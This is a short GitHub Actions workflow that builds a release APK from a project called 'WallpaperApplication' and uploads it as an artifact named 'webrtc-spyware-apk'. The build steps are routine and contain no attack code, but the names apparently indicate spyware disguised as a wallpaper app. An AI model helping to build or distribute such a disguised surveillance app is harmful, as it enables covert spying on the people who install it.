name: Build WebRTC APK

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      - name: Grant execute permission
        working-directory: WallpaperApplication
        run: chmod +x gradlew

      - name: Build APK
        working-directory: WallpaperApplication
        run: ./gradlew assembleRelease

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: webrtc-spyware-apk
          path: WallpaperApplication/app/build/outputs/apk/release/*.apk
